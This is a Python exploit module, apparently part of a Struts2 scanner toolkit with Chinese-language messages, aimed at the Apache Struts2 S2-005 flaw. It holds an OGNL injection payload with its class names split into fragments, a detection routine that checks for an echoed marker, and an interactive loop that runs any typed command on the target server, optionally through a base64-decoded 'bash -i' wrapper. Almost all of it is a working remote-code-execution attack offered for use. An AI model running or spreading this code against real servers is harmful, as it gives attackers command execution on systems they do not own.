#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re

def s2_005(url):
    print("[*] 开始检测S2-005")
    vul_nname = "s2_005"
    cmd = "echo 78468794903108696"
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        "Content-type" : "application/x-www-form-urlencoded",
    }
    payload = r"redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder('"+urllib.parse.quote(cmd)+r"'.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"

    try:
        vurl = urllib.parse.urljoin(url, '/index.action')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)
        if "78468794903108696" in req.text and re.search("echo.{0,10}" + "78468794903108696", req.text) == None:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass

def s2_005_exp(url):
    try:
        cmdtype = input("命令模式：[1]默认;[2*]base64 : ")
    except:exit()

    if cmdtype == "2":
        print("[2]base64命令模式")
    else:
        print("[1]默认模式")

    while 1:
        try:
            cmd = input("> ")
            if cmd == '':continue
            if cmd == 'exit':exit()
        except:exit()

        if cmdtype == "2":
            cmd = "bash -c {echo,"+str(base64.b64encode(cmd.encode('utf-8')),'utf-8')+"}|{base64,-d}|{bash,-i}"
            
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
            "Content-type" : "application/x-www-form-urlencoded",
        }
        payload = r"redirect:${%23req%3d%23context.get(%27co%27%2b%27m.ope%27%2b%27nsymphony.xwo%27%2b%27rk2.dispat%27%2b%27cher.Htt%27%2b%27pServ%27%2b%27letReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder('"+urllib.parse.quote(cmd)+r"'.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
        try:
            vurl = urllib.parse.urljoin(url, '/index.action')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)
            print(req.text)
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass